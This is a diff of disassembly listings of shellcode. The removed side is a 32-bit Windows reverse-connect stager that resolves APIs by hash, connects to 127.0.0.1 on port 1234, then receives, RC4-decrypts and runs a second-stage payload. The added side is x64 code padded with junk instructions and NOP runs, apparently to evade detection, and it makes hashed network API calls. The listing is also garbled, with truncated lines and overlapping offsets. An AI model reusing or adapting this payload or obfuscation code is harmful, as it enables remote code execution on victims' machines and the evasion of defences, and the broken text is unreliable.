@@ -1,414 +1,456 @@
-0x0 bytearray(b'\xfc') 1  cld  
-0x1 bytearray(b'\xe8\x8f\x00\x00\x00') 5  call  0x95
-0x6 bytearray(b'`') 1  pushal  
-0x7 bytearray(b'\x89\xe5') 2  mov  ebp, esp
-0x9 bytearray(b'1\xd2') 2  xor  edx, edx
-0xb bytearray(b'd\x8bR0') 4  mov  edx, dword ptr fs:[edx + 0x30]
-0xf bytearray(b'\x8bR\x0c') 3  mov  edx, dword ptr [edx + 0xc]
-0x12 bytearray(b'\x8bR\x14') 3  mov  edx, dword ptr [edx + 0x14]
-0x15 bytearray(b'\x0f\xb7J&') 4  movzx  ecx, word ptr [edx + 0x26]
-0x19 bytearray(b'1\xff') 2  xor  edi, edi
-0x1b bytearray(b'\x8br(') 3  mov  esi, dword ptr [edx + 0x28]
-0x1e bytearray(b'1\xc0') 2  xor  eax, eax
-0x20 bytearray(b'\xac') 1  lodsb  al, byte ptr [esi]
-0x21 bytearray(b'<a') 2  cmp  al, 0x61
-0x23 bytearray(b'|\x02') 2  jl  0x27
-0x25 bytearray(b', ') 2  sub  al, 0x20
-0x27 bytearray(b'\xc1\xcf\r') 3  ror  edi, 0xd
-0x2a bytearray(b'\x01\xc7') 2  add  edi, eax
-0x2c bytearray(b'I') 1  dec  ecx
-0x2d bytearray(b'u\xef') 2  jne  0x1e
-0x2f bytearray(b'R') 1  push  edx
-0x30 bytearray(b'W') 1  push  edi
-0x31 bytearray(b'\x8bR\x10') 3  mov  edx, dword ptr [edx + 0x10]
-0x34 bytearray(b'\x8bB<') 3  mov  eax, dword ptr [edx + 0x3c]
-0x37 bytearray(b'\x01\xd0') 2  add  eax, edx
-0x39 bytearray(b'\x8b@x') 3  mov  eax, dword ptr [eax + 0x78]
-0x3c bytearray(b'\x85\xc0') 2  test  eax, eax
-0x3e bytearray(b'tL') 2  je  0x8c
-0x40 bytearray(b'\x01\xd0') 2  add  eax, edx
-0x42 bytearray(b'\x8bH\x18') 3  mov  ecx, dword ptr [eax + 0x18]
-0x45 bytearray(b'P') 1  push  eax
-0x46 bytearray(b'\x8bX ') 3  mov  ebx, dword ptr [eax + 0x20]
-0x49 bytearray(b'\x01\xd3') 2  add  ebx, edx
-0x4b bytearray(b'\x85\xc9') 2  test  ecx, ecx
-0x4d bytearray(b't<') 2  je  0x8b
-0x4f bytearray(b'1\xff') 2  xor  edi, edi
-0x51 bytearray(b'I') 1  dec  ecx
-0x52 bytearray(b'\x8b4\x8b') 3  mov  esi, dword ptr [ebx + ecx*4]
-0x55 bytearray(b'\x01\xd6') 2  add  esi, edx
-0x57 bytearray(b'1\xc0') 2  xor  eax, eax
-0x59 bytearray(b'\xc1\xcf\r') 3  ror  edi, 0xd
-0x5c bytearray(b'\xac') 1  lodsb  al, byte ptr [esi]
-0x5d bytearray(b'\x01\xc7') 2  add  edi, eax
-0x5f bytearray(b'8\xe0') 2  cmp  al, ah
-0x61 bytearray(b'u\xf4') 2  jne  0x57
-0x63 bytearray(b'\x03}\xf8') 3  add  edi, dword ptr [ebp - 8]
-0x66 bytearray(b';}$') 3  cmp  edi, dword ptr [ebp + 0x24]
-0x69 bytearray(b'u\xe0') 2  jne  0x4b
-0x6b bytearray(b'X') 1  pop  eax
-0x6c bytearray(b'\x8bX$') 3  mov  ebx, dword ptr [eax + 0x24]
-0x6f bytearray(b'\x01\xd3') 2  add  ebx, edx
-0x71 bytearray(b'f\x8b\x0cK') 4  mov  cx, word ptr [ebx + ecx*2]
-0x75 bytearray(b'\x8bX\x1c') 3  mov  ebx, dword ptr [eax + 0x1c]
-0x78 bytearray(b'\x01\xd3') 2  add  ebx, edx
-0x7a bytearray(b'\x8b\x04\x8b') 3  mov  eax, dword ptr [ebx + ecx*4]
-0x7d bytearray(b'\x01\xd0') 2  add  eax, edx
-0x7f bytearray(b'\x89D$$') 4  mov  dword ptr [esp + 0x24], eax
-0x83 bytearray(b'[') 1  pop  ebx
-0x84 bytearray(b'[') 1  pop  ebx
-0x85 bytearray(b'a') 1  popal  
-0x86 bytearray(b'Y') 1  pop  ecx
-0x87 bytearray(b'Z') 1  pop  edx
-0x88 bytearray(b'Q') 1  push  ecx
-0x89 bytearray(b'\xff\xe0') 2  jmp  eax
-0x8b bytearray(b'X') 1  pop  eax
-0x8c bytearray(b'_') 1  pop  edi
-0x8d bytearray(b'Z') 1  pop  edx
-0x8e bytearray(b'\x8b\x12') 2  mov  edx, dword ptr [edx]
-0x90 bytearray(b'\xe9\x80\xff\xff\xff') 5  jmp  0x15
-0x95 bytearray(b']') 1  pop  ebp
-0x96 bytearray(b'h32\x00\x00') 5  push  0x3233
-0x9b bytearray(b'hws2_') 5  push  0x5f327377
-0xa0 bytearray(b'T') 1  push  esp
-0xa1 bytearray(b'hLw&\x07') 5  push  0x726774c
-0xa6 bytearray(b'\xff\xd5') 2  call  ebp
-0xa8 bytearray(b'\xb8\x90\x01\x00\x00') 5  mov  eax, 0x190
-0xad bytearray(b')\xc4') 2  sub  esp, eax
-0xaf bytearray(b'T') 1  push  esp
-0xb0 bytearray(b'P') 1  push  eax
-0xb1 bytearray(b'h)\x80k\x00') 5  push  0x6b8029
-0xb6 bytearray(b'\xff\xd5') 2  call  ebp
-0xb8 bytearray(b'P') 1  push  eax
-0xb9 bytearray(b'P') 1  push  eax
-0xba bytearray(b'P') 1  push  eax
-0xbb bytearray(b'P') 1  push  eax
-0xbc bytearray(b'@') 1  inc  eax
-0xbd bytearray(b'P') 1  push  eax
-0xbe bytearray(b'@') 1  inc  eax
-0xbf bytearray(b'P') 1  push  eax
-0xc0 bytearray(b'h\xea\x0f\xdf\xe0') 5  push  0xe0df0fea
-0xc5 bytearray(b'\xff\xd5') 2  call  ebp
-0xc7 bytearray(b'\x97') 1  xchg  edi, eax
-0xc8 bytearray(b'\xe8\n\x00\x00\x00') 5  call  0xd7
-0xcd bytearray(b'12') 2  xor  dword ptr [edx], esi
-0xcf bytearray(b'7') 1  aaa  
-0xd0 bytearray(b'.0.') 3  xor  byte ptr cs:[esi], ch
-0xd3 bytearray(b'0.') 2  xor  byte ptr [esi], ch
-0xd5 bytearray(b'1\x00') 2  xor  dword ptr [eax], eax
-0xd7 bytearray(b'h\xa9(4\x80') 5  push  0x803428a9
-0xdc bytearray(b'\xff\xd5') 2  call  ebp
-0xde bytearray(b'\x8b@\x1c') 3  mov  eax, dword ptr [eax + 0x1c]
-0xe1 bytearray(b'j\n') 2  push  0xa
-0xe3 bytearray(b'P') 1  push  eax
-0xe4 bytearray(b'h\x02\x00\x04\xd2') 5  push  0xd2040002
-0xe9 bytearray(b'\x89\xe6') 2  mov  esi, esp
-0xeb bytearray(b'j\x10') 2  push  0x10
-0xed bytearray(b'V') 1  push  esi
-0xee bytearray(b'W') 1  push  edi
-0xef bytearray(b'h\x99\xa5ta') 5  push  0x6174a599
-0xf4 bytearray(b'\xff\xd5') 2  call  ebp
-0xf6 bytearray(b'\x85\xc0') 2  test  eax, eax
-0xf8 bytearray(b't\n') 2  je  0x104
-0xfa bytearray(b'\xffN\x08') 3  dec  dword ptr [esi + 8]
-0xfd bytearray(b'u\xec') 2  jne  0xeb
-0xff bytearray(b'\xe8\xdc\x00\x00\x00') 5  call  0x1e0
-0x104 bytearray(b'j\x00') 2  push  0
-0x106 bytearray(b'j\x04') 2  push  4
-0x108 bytearray(b'V') 1  push  esi
-0x109 bytearray(b'W') 1  push  edi
-0x10a bytearray(b'h\x02\xd9\xc8_') 5  push  0x5fc8d902
-0x10f bytearray(b'\xff\xd5') 2  call  ebp
-0x111 bytearray(b'\x83\xf8\x00') 3  cmp  eax, 0
-0x114 bytearray(b'~I') 2  jle  0x15f
-0x116 bytearray(b'\x8b6') 2  mov  esi, dword ptr [esi]
-0x118 bytearray(b'\x81\xf6\xa0\x05\xa2\xd3') 6  xor  esi, 0xd3a205a0
-0x11e bytearray(b'\x8d\x8e\x00\x01\x00\x00') 6  lea  ecx, [esi + 0x100]
-0x124 bytearray(b'j@') 2  push  0x40
-0x126 bytearray(b'h\x00\x10\x00\x00') 5  push  0x1000
-0x12b bytearray(b'Q') 1  push  ecx
-0x12c bytearray(b'j\x00') 2  push  0
-0x12e bytearray(b'hX\xa4S\xe5') 5  push  0xe553a458
-0x133 bytearray(b'\xff\xd5') 2  call  ebp
-0x135 bytearray(b'\x8d\x98\x00\x01\x00\x00') 6  lea  ebx, [eax + 0x100]
-0x13b bytearray(b'S') 1  push  ebx
-0x13c bytearray(b'V') 1  push  esi
-0x13d bytearray(b'P') 1  push  eax
-0x13e bytearray(b'j\x00') 2  push  0
-0x140 bytearray(b'V') 1  push  esi
-0x141 bytearray(b'S') 1  push  ebx
-0x142 bytearray(b'W') 1  push  edi
-0x143 bytearray(b'h\x02\xd9\xc8_') 5  push  0x5fc8d902
-0x148 bytearray(b'\xff\xd5') 2  call  ebp
-0x14a bytearray(b'\x83\xf8\x00') 3  cmp  eax, 0
-0x14d bytearray(b'}(') 2  jge  0x177
-0x14f bytearray(b'X') 1  pop  eax
-0x150 bytearray(b'h\x00@\x00\x00') 5  push  0x4000
-0x155 bytearray(b'j\x00') 2  push  0
-0x157 bytearray(b'P') 1  push  eax
-0x158 bytearray(b'h\x0b/\x0f0') 5  push  0x300f2f0b
-0x15d bytearray(b'\xff\xd5') 2  call  ebp
-0x15f bytearray(b'W') 1  push  edi
-0x160 bytearray(b'hunMa') 5  push  0x614d6e75
-0x165 bytearray(b'\xff\xd5') 2  call  ebp
-0x167 bytearray(b'^') 1  pop  esi
-0x168 bytearray(b'^') 1  pop  esi
-0x169 bytearray(b'\xff\x0c$') 3  dec  dword ptr [esp]
-0x16c bytearray(b'\x0f\x85V\xff\xff\xff') 6  jne  0xc8
-0x172 bytearray(b'\xe9\x88\xff\xff\xff') 5  jmp  0xff
-0x177 bytearray(b'\x01\xc3') 2  add  ebx, eax
-0x179 bytearray(b')\xc6') 2  sub  esi, eax
-0x17b bytearray(b'u\xc1') 2  jne  0x13e
-0x17d bytearray(b'[') 1  pop  ebx
-0x17e bytearray(b'Y') 1  pop  ecx
-0x17f bytearray(b']') 1  pop  ebp
-0x180 bytearray(b'U') 1  push  ebp
-0x181 bytearray(b'W') 1  push  edi
-0x182 bytearray(b'\x89\xdf') 2  mov  edi, ebx
-0x184 bytearray(b'\xe8\x10\x00\x00\x00') 5  call  0x199
-0x189 bytearray(b'4*') 2  xor  al, 0x2a
-0x18b bytearray(b'h~\xa2\xd0S') 5  push  0x53d0a27e
-0x190 bytearray(b'`') 1  pushal  
-0x191 bytearray(b'\xc9') 1  leave  
-0x192 bytearray(b'S') 1  push  ebx
-0x193 bytearray(b'\x10z\xcb') 3  adc  byte ptr [edx - 0x35], bh
-0x196 bytearray(b'\xe8>\x08^1') 5  call  0x315e09d9
-0x19b bytearray(b'\xc0\xaa\xfe\xc0u\xfb\x81') 7  shr  byte ptr [edx - 0x48a3f02], 0x81
-0x1a2 bytearray(b'\xef') 1  out  dx, eax
-0x1a3 bytearray(b'\x00\x01') 2  add  byte ptr [ecx], al
-0x1a5 bytearray(b'\x00\x00') 2  add  byte ptr [eax], al
-0x1a7 bytearray(b'1\xdb') 2  xor  ebx, ebx
-0x1a9 bytearray(b'\x02\x1c\x07') 3  add  bl, byte ptr [edi + eax]
-0x1ac bytearray(b'\x89\xc2') 2  mov  edx, eax
-0x1ae bytearray(b'\x80\xe2\x0f') 3  and  dl, 0xf
-0x1b1 bytearray(b'\x02\x1c\x16') 3  add  bl, byte ptr [esi + edx]
-0x1b4 bytearray(b'\x8a\x14\x07') 3  mov  dl, byte ptr [edi + eax]
-0x1b7 bytearray(b'\x86\x14\x1f') 3  xchg  byte ptr [edi + ebx], dl
-0x1ba bytearray(b'\x88\x14\x07') 3  mov  byte ptr [edi + eax], dl
-0x1bd bytearray(b'\xfe\xc0') 2  inc  al
-0x1bf bytearray(b'u\xe8') 2  jne  0x1a9
-0x1c1 bytearray(b'1\xdb') 2  xor  ebx, ebx
-0x1c3 bytearray(b'\xfe\xc0') 2  inc  al
-0x1c5 bytearray(b'\x02\x1c\x07') 3  add  bl, byte ptr [edi + eax]
-0x1c8 bytearray(b'\x8a\x14\x07') 3  mov  dl, byte ptr [edi + eax]
-0x1cb bytearray(b'\x86\x14\x1f') 3  xchg  byte ptr [edi + ebx], dl
-0x1ce bytearray(b'\x88\x14\x07') 3  mov  byte ptr [edi + eax], dl
-0x1d1 bytearray(b'\x02\x14\x1f') 3  add  dl, byte ptr [edi + ebx]
-0x1d4 bytearray(b'\x8a\x14\x17') 3  mov  dl, byte ptr [edi + edx]
-0x1d7 bytearray(b'0U\x00') 3  xor  byte ptr [ebp], dl
-0x1da bytearray(b'E') 1  inc  ebp
-0x1db bytearray(b'I') 1  dec  ecx
-0x1dc bytearray(b'u\xe5') 2  jne  0x1c3
-0x1de bytearray(b'_') 1  pop  edi
-0x1df bytearray(b'\xc3') 1  ret  
-0x1e0 bytearray(b'\xbb\xf0\xb5\xa2V') 5  mov  ebx, 0x56a2b5f0
-0x1e5 bytearray(b'j\x00') 2  push  0
-0x1e7 bytearray(b'S') 1  push  ebx
-0x1e8 bytearray(b'\xff\xd5') 2  call  ebp
-rray(b'^') 1  pop  esi
-0x1b4 bytearray(b'\x9d') 1  popfd  
-0x1b5 bytearray(b't\x04') 2  je  0x1bb
-0x1b7 bytearray(b'\x90') 1  nop  
-0x1b8 bytearray(b'\x90') 1  nop  
-0x1b9 bytearray(b'\x90') 1  nop  
-0x1ba bytearray(b'\x90') 1  nop  
-0x1bb bytearray(b'h32\x00\x00') 5  push  0x3233
-0x1c0 bytearray(b'hws2_') 5  push  0x5f327377
-0x1c5 bytearray(b'T') 1  push  esp
-0x1c6 bytearray(b'\x9c') 1  pushfd  
-0x1c7 bytearray(b'R') 1  push  edx
-0x1c8 bytearray(b'j\n') 2  push  0xa
-0x1ca bytearray(b'Z') 1  pop  edx
-0x1cb bytearray(b'\x83\xfa\n') 3  cmp  edx, 0xa
-0x1ce bytearray(b'Z') 1  pop  edx
-0x1cf bytearray(b'\x9d') 1  popfd  
-0x1d0 bytearray(b't\x02') 2  je  0x1d4
-0x1d2 bytearray(b'\x90') 1  nop  
-0x1d3 bytearray(b'\x90') 1  nop  
-0x1d4 bytearray(b'hLw&\x07') 5  push  0x726774c
-0x1d9 bytearray(b'\x9c') 1  pushfd  
-0x1da bytearray(b'Q') 1  push  ecx
-0x1db bytearray(b'\xb9\x87\x00\x00\x00') 5  mov  ecx, 0x87
-0x1e0 bytearray(b'\x83\xe1\xff') 3  and  ecx, 0xffffffff
-0x1e3 bytearray(b'\x81\xf9\x87\x00\x00\x00') 6  cmp  ecx, 0x87
-0x1e9 bytearray(b'Y') 1  pop  ecx
-0x1ea bytearray(b'\x9d') 1  popfd  
-0x1eb bytearray(b't\x02') 2  je  0x1ef
+0x0 bytearray(b'H\xc7\xc0\x01\x00\x00\x00') 7  mov  rax, 1
+0x7 bytearray(b'f\x9c') 2  pushf  
+0x9 bytearray(b'I\xc1\xe4\x00') 4  shl  r12, 0
+0xd bytearray(b'f\x9d') 2  popf  
+0xf bytearray(b'f\x9c') 2  pushf  
+0x11 bytearray(b'AS') 2  push  r11
+0x13 bytearray(b'I\xc7\xc3E\x00\x00\x00') 7  mov  r11, 0x45
+0x1a bytearray(b'f\x9c') 2  pushf  
+0x1c bytearray(b'H\x89\xd2') 3  mov  rdx, rdx
+0x1f bytearray(b'f\x9d') 2  popf  
+0x21 bytearray(b'M\x85\xdb') 3  test  r11, r11
+0x24 bytearray(b'A[') 2  pop  r11
+0x26 bytearray(b'f\x9d') 2  popf  
+0x28 bytearray(b'\x0f\x84\x00\x00\x00\x00') 6  je  0x2e
+0x2a bytearray(b'\x90') 1  nop  
+0x2b bytearray(b'\x90') 1  nop  
+0x2c bytearray(b'f\x9c') 2  pushf  
+0x2e bytearray(b'Q') 1  push  rcx
+0x2f bytearray(b'j\x0e') 2  push  0xe
+0x31 bytearray(b'f\x9c') 2  pushf  
+0x33 bytearray(b'H\xff\xca') 3  dec  rdx
+0x36 bytearray(b'H\xff\xc2') 3  inc  rdx
+0x39 bytearray(b'f\x9d') 2  popf  
+0x3b bytearray(b'Y') 1  pop  rcx
+0x3c bytearray(b'H\x83\xf9\x0e') 4  cmp  rcx, 0xe
+0x40 bytearray(b'Y') 1  pop  rcx
+0x41 bytearray(b'f\x9d') 2  popf  
+0x43 bytearray(b'\x0f\x84\x00\x00\x00\x00') 6  je  0x49
+0x45 bytearray(b'\x90') 1  nop  
+0x46 bytearray(b'\x90') 1  nop  
+0x47 bytearray(b'f\x9c') 2  pushf  
+0x49 bytearray(b'H\xff\xc9') 3  dec  rcx
+0x4c bytearray(b'H\xff\xc1') 3  inc  rcx
+0x4f bytearray(b'f\x9d') 2  popf  
+0x51 bytearray(b'\x90') 1  nop  
+0x52 bytearray(b'\x90') 1  nop  
+0x53 bytearray(b'H\xc7\xc2\x00\x00\x00\x00') 7  mov  rdx, 0
+0x5a bytearray(b'I\xc7\xc0\x06\x00\x00\x00') 7  mov  r8, 6
+0x61 bytearray(b'f\x9c') 2  pushf  
+0x63 bytearray(b'AP') 2  push  r8
+0x65 bytearray(b'I\xc7\xc0\xd5\x00\x00\x00') 7  mov  r8, 0xd5
+0x6c bytearray(b'I\x81\xf8\xd5\x00\x00\x00') 7  cmp  r8, 0xd5
+0x73 bytearray(b'f\x9c') 2  pushf  
+0x75 bytearray(b'H\xc1\xd9\x00') 4  rcr  rcx, 0
+0x79 bytearray(b'f\x9d') 2  popf  
+0x7b bytearray(b'AX') 2  pop  r8
+0x7d bytearray(b'f\x9d') 2  popf  
+0x7f bytearray(b'\x0f\x84\x00\x00\x00\x00') 6  je  0x85
+0x81 bytearray(b'f\x9c') 2  pushf  
+0x83 bytearray(b'H!\xd2') 3  and  rdx, rdx
+0x86 bytearray(b'f\x9d') 2  popf  
+0x88 bytearray(b'f\x9c') 2  pushf  
+0x8a bytearray(b'M!\xdb') 3  and  r11, r11
+0x8d bytearray(b'f\x9d') 2  popf  
+0x8f bytearray(b'f\x9c') 2  pushf  
+0x91 bytearray(b'M!\xc0') 3  and  r8, r8
+0x94 bytearray(b'f\x9d') 2  popf  
+0x96 bytearray(b'\x90') 1  nop  
+0x97 bytearray(b'\x90') 1  nop  
+0x98 bytearray(b'\x90') 1  nop  
+0x99 bytearray(b'\x90') 1  nop  
+0x9a bytearray(b'H\x01\xc2') 3  add  rdx, rax
+0x9d bytearray(b'f\x9c') 2  pushf  
+0x9f bytearray(b'R') 1  push  rdx
+0xa0 bytearray(b'h\xec\x00\x00\x00') 5  push  0xec
+0xa5 bytearray(b'Z') 1  pop  rdx
+0xa6 bytearray(b'H\x81\xfa\xec\x00\x00\x00') 7  cmp  rdx, 0xec
+0xad bytearray(b'Z') 1  pop  rdx
+0xae bytearray(b'f\x9d') 2  popf  
+0xb0 bytearray(b'\x0f\x84\x00\x00\x00\x00') 6  je  0xb6
+0xb2 bytearray(b'\x90') 1  nop  
+0xb3 bytearray(b'\x90') 1  nop  
+0xb4 bytearray(b'\x90') 1  nop  
+0xb5 bytearray(b'\x90') 1  nop  
+0xb6 bytearray(b'f\x9c') 2  pushf  
+0xb8 bytearray(b'M\x89\xdb') 3  mov  r11, r11
+0xbb bytearray(b'f\x9d') 2  popf  
+0xbd bytearray(b'\x90') 1  nop  
+0xbe bytearray(b'H\xd1\xe0') 3  shl  rax, 1
+0xc1 bytearray(b'I\x83\xe8\x01') 4  sub  r8, 1
+0xc5 bytearray(b'f\x9c') 2  pushf  
+0xc7 bytearray(b'H9\xf6') 3  cmp  rsi, rsi
+0xca bytearray(b'f\x9d') 2  popf  
+0xcc bytearray(b'f\x9c') 2  pushf  
+0xce bytearray(b'H\x8d6') 3  lea  rsi, [rsi]
+0xd1 bytearray(b'f\x9d') 2  popf  
+0xd3 bytearray(b'f\x9c') 2  pushf  
+0xd5 bytearray(b'I\xc1\xd5\x00') 4  rcl  r13, 0
+0xd9 bytearray(b'f\x9d') 2  popf  
+0xdb bytearray(b'\x0f\x84\x00\x00\x00\x00') 6  je  0xe1
+0xdd bytearray(b'\x90') 1  nop  
+0xde bytearray(b'\x90') 1  nop  
+0xdf bytearray(b'\x0f\x85\x00\x00\x00\x00') 6  jne  0xe5
+0xe1 bytearray(b'H\x89\x11') 3  mov  qword ptr [rcx], rdx
+0xe4 bytearray(b'H\x83\xfa?') 4  cmp  rdx, 0x3f
+0xe8 bytearray(b'f\x9c') 2  pushf  
+0xea bytearray(b'AT') 2  push  r12
+0xec bytearray(b'I\xc7\xc4w\x00\x00\x00') 7  mov  r12, 0x77
+0xf3 bytearray(b'I\x83\xec\x00') 4  sub  r12, 0
+0xf7 bytearray(b'I\x83\xfcw') 4  cmp  r12, 0x77
+0xfb bytearray(b'A\\') 2  pop  r12
+0xfd bytearray(b'f\x9c') 2  pushf  
+0xff bytearray(b'H\t\xd2') 3  or  rdx, rdx
+0x102 bytearray(b'f\x9d') 2  popf  
+0x104 bytearray(b'f\x9d') 2  popf  
+0x106 bytearray(b'\x0f\x84\x00\x00\x00\x00') 6  je  0x10c
+0x108 bytearray(b'f\x9c') 2  pushf  
+0x10a bytearray(b'I\xc1\xd6\x00') 4  rcl  r14, 0
+0x10e bytearray(b'f\x9d') 2  popf  
+0x110 bytearray(b'\x90') 1  nop  
+0x111 bytearray(b'f\x9c') 2  pushf  
+0x113 bytearray(b'I\x83\xef\x00') 4  sub  r15, 0
+0x117 bytearray(b'f\x9d') 2  popf  
+0x119 bytearray(b'\x90') 1  nop  
+0x11a bytearray(b'\x90') 1  nop  
+0x11b bytearray(b'\x0f\x85\x00\x00\x00\x00') 6  jne  0x121
+0x11d bytearray(b'H\xc7A\x08\r`\x00\x00') 8  mov  qword ptr [rcx + 8], 0x600d
+0x125 bytearray(b'\xc3') 1  ret  
+ 
+0x127 bytearray(b'I\xc1\xdb\x00') 4  rcr  r11, 0
+0x12b bytearray(b'f\x9d') 2  popf  
+0x12d bytearray(b'\x0f\x85\x00\x00\x00\x00') 6  jne  0x133
+0x12f bytearray(b'H\xc7A\x08\r`\x00\x00') 8  mov  qword ptr [rcx + 8], 0x600d
+0x137 bytearray(b'\xc3') 1  ret  
+  
+0x141 bytearray(b'\xc3') 1  ret  
+ 1  nop  
+0x122 bytearray(b'\x90') 1  nop  
+0x123 bytearray(b'\x90') 1  nop  
+0x124 bytearray(b'\x90') 1  nop  
+0x31f bytearray(b'L\x8d\x05\x86\x00\x00\x00') 7  lea  r8, [rip + 0x86]
+0x12c bytearray(b'\x90') 1  nop  
+0x12d bytearray(b'\x90') 1  nop  
+0x12e bytearray(b'\x90') 1  nop  
+0x12f bytearray(b'\x90') 1  nop  
+0x130 bytearray(b'\x90') 1  nop  
+0x131 bytearray(b'\x90') 1  nop  
+0x132 bytearray(b'\x90') 1  nop  
+0x133 bytearray(b'\x90') 1  nop  
+0x134 bytearray(b'\x90') 1  nop  
+0x135 bytearray(b'\x90') 1  nop  
+0x136 bytearray(b'\x90') 1  nop  
+0x137 bytearray(b'H1\xc9') 3  xor  rcx, rcx
+0x13a bytearray(b'A\xbaE\x83V\x07') 6  mov  r10d, 0x7568345
+0x140 bytearray(b'\xff\xd5') 2  call  rbp
+0x142 bytearray(b'H1\xc9') 3  xor  rcx, rcx
+0x145 bytearray(b'A\xba\xf0\xb5\xa2V') 6  mov  r10d, 0x56a2b5f0
+0x14b bytearray(b'\xff\xd5') 2  call  rbp
+nop  
+0x13b bytearray(b'\x90') 1  nop  
+0x13c bytearray(b'\x90') 1  nop  
+0x13d bytearray(b'\x90') 1  nop  
+0x13e bytearray(b'\x90') 1  nop  
+0x13f bytearray(b'\x90') 1  nop  
+0x140 bytearray(b'\x90') 1  nop  
+0x141 bytearray(b'\x90') 1  nop  
+0x142 bytearray(b'\x90') 1  nop  
+0x143 bytearray(b'\x90') 1  nop  
+0x144 bytearray(b'\x90') 1  nop  
+0x145 bytearray(b'\x90') 1  nop  
+0x146 bytearray(b'\x90') 1  nop  
+0x147 bytearray(b'\x90') 1  nop  
+0x148 bytearray(b'\x90') 1  nop  
+0x149 bytearray(b'\x90') 1  nop  
+0x14a bytearray(b'\x90') 1  nop  
+0x14b bytearray(b'\x90') 1  nop  
+0x14c bytearray(b'\x90') 1  nop  
+0x14d bytearray(b'\x90') 1  nop  
+0x14e bytearray(b'\x90') 1  nop  
+0x14f bytearray(b'\x90') 1  nop  
+0x150 bytearray(b'\x90') 1  nop  
+0x151 bytearray(b'\x90') 1  nop  
+0x152 bytearray(b'\x90') 1  nop  
+0x153 bytearray(b'\x90') 1  nop  
+0x154 bytearray(b'\x90') 1  nop  
+0x155 bytearray(b'\x90') 1  nop  
+0x156 bytearray(b'\x90') 1  nop  
+0x157 bytearray(b'\x90') 1  nop  
+0x158 bytearray(b'\x90') 1  nop  
+0x159 bytearray(b'\x90') 1  nop  
+0x15a bytearray(b'\x90') 1  nop  
+0x15b bytearray(b'\x90') 1  nop  
+0x15c bytearray(b'\x90') 1  nop  
+0x15d bytearray(b'\x90') 1  nop  
+0x15e bytearray(b'\x90') 1  nop  
+0x15f bytearray(b'\x90') 1  nop  
+0x160 bytearray(b'\x90') 1  nop  
+0x161 bytearray(b'\x90') 1  nop  
+0x162 bytearray(b'\x90') 1  nop  
+0x163 bytearray(b'\x90') 1  nop  
+0x164 bytearray(b'\x90') 1  nop  
+0x165 bytearray(b'\x90') 1  nop  
+0x166 bytearray(b'\x90') 1  nop  
+0x167 bytearray(b'\x90') 1  nop  
+0x168 bytearray(b'\x90') 1  nop  
+0x169 bytearray(b'\x90') 1  nop  
+0x16a bytearray(b'\x90') 1  nop  
+0x16b bytearray(b'\x90') 1  nop  
+0x16c bytearray(b'\x90') 1  nop  
+0x16d bytearray(b'\x90') 1  nop  
+0x16e bytearray(b'\x90') 1  nop  
+0x16f bytearray(b'\x90') 1  nop  
+0x170 bytearray(b'\x90') 1  nop  
+0x171 bytearray(b'\x90') 1  nop  
+0x172 bytearray(b'\x90') 1  nop  
+0x173 bytearray(b'\x90') 1  nop  
+0x174 bytearray(b'\x90') 1  nop  
+0x175 bytearray(b'\x90') 1  nop  
+0x176 bytearray(b'\x90') 1  nop  
+0x177 bytearray(b'\x90') 1  nop  
+0x178 bytearray(b'\x90') 1  nop  
+0x179 bytearray(b'\x90') 1  nop  
+0x17a bytearray(b'\x90') 1  nop  
+0x17b bytearray(b'\x90') 1  nop  
+0x17c bytearray(b'\x90') 1  nop  
+0x17d bytearray(b'\x90') 1  nop  
+0x17e bytearray(b'\x90') 1  nop  
+0x17f bytearray(b'\x90') 1  nop  
+0x180 bytearray(b'\x90') 1  nop  
+0x181 bytearray(b'\x90') 1  nop  
+0x182 bytearray(b'\x90') 1  nop  
+0x183 bytearray(b'\x90') 1  nop  
+0x184 bytearray(b'\x90') 1  nop  
+0x185 bytearray(b'\x90') 1  nop  
+0x186 bytearray(b'\x90') 1  nop  
+0x187 bytearray(b'\x90') 1  nop  
+0x188 bytearray(b'\x90') 1  nop  
+0x189 bytearray(b'\x90') 1  nop  
+0x18a bytearray(b'\x90') 1  nop  
+0x18b bytearray(b'\x90') 1  nop  
+0x18c bytearray(b'\x90') 1  nop  
+0x18d bytearray(b'\x90') 1  nop  
+0x18e bytearray(b'\x90') 1  nop  
+0x18f bytearray(b'\x90') 1  nop  
+0x190 bytearray(b'\x90') 1  nop  
+0x191 bytearray(b'S') 1  push  rbx
+0x192 bytearray(b'Z') 1  pop  rdx
+0x193 bytearray(b'M1\xc0') 3  xor  r8, r8
+0x196 bytearray(b'M1\xc9') 3  xor  r9, r9
+0x199 bytearray(b'S') 1  push  rbx
+0x19a bytearray(b'S') 1  push  rbx
+0x19b bytearray(b'I\xba:Vy\xa7\x00\x00\x00\x00') 10  movabs  r10, 0xa779563a
+0x1a5 bytearray(b'\xff\xd5') 2  call  rbp
+0x45a bytearray(b'H\x8d\x15\xf1\x03\x00\x00') 7  lea  rdx, [rip + 0x3f1]
+0x1ae bytearray(b'\x90') 1  nop  
+0x1af bytearray(b'\x90') 1  nop  
+0x1b0 bytearray(b'\x90') 1  nop  
+0x1b1 bytearray(b'\x90') 1  nop  
+0x1b2 bytearray(b'\x90') 1  nop  
+0x1b3 bytearray(b'\x90') 1  nop  
+0x1b4 bytearray(b'\x90') 1  nop  
+0x1b5 bytearray(b'\x90') 1  nop  
+0x1b6 bytearray(b'\x90') 1  nop  
+0x1b7 bytearray(b'H\x89\xc1') 3  mov  rcx, rax
+0x1ba bytearray(b'I\xc7\xc0\xd2\x04\x00\x00') 7  mov  r8, 0x4d2
+0x1c1 bytearray(b'M1\xc9') 3  xor  r9, r9
+0x1c4 bytearray(b'S') 1  push  rbx
+0x1c5 bytearray(b'S') 1  push  rbx
+0x1c6 bytearray(b'j\x03') 2  push  3
+0x1c8 bytearray(b'S') 1  push  rbx
+0x1c9 bytearray(b'I\xbaW\x89\x9f\xc6\x00\x00\x00\x00') 10  movabs  r10, 0xc69f8957
+0x1d3 bytearray(b'\xff\xd5') 2  call  rbp
+0x4cf bytearray(b'\xe9\x88\x03\x00\x00') 5  jmp  0x85c
+0x1da bytearray(b'\x90') 1  nop  
+0x1db bytearray(b'\x90') 1  nop  
+0x1dc bytearray(b'\x90') 1  nop  
+0x1dd bytearray(b'\x90') 1  nop  
+0x1de bytearray(b'\x90') 1  nop  
+0x1df bytearray(b'\x90') 1  nop  
+0x1e0 bytearray(b'\x90') 1  nop  
+0x1e1 bytearray(b'\x90') 1  nop  
+0x1e2 bytearray(b'\x90') 1  nop  
+0x1e3 bytearray(b'\x90') 1  nop  
+0x1e4 bytearray(b'\x90') 1  nop  
+0x1e5 bytearray(b'\x90') 1  nop  
